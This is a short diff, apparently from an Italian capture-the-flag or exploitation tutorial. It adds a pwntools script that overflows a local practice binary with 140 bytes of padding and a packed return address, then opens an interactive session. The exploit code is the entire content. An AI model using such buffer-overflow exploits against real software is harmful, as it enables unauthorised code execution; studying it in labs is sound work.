@@ -42,7 +42,13 @@ Crea UN FILE exploit.py
 
 from pwn import *
 
-print ('A' * numero_offset +p32(indirizzo).decode())
+p = process('./pwn1')
+garbage = 'a' * 140    #OFFSET
+target_address = 0x080484ad  #CAMBIALO
+address = p32(target_address)
+msgin = garbage.encode('ascii') + address
+p.sendline(msgin)
+p.interactive()
 
 
 
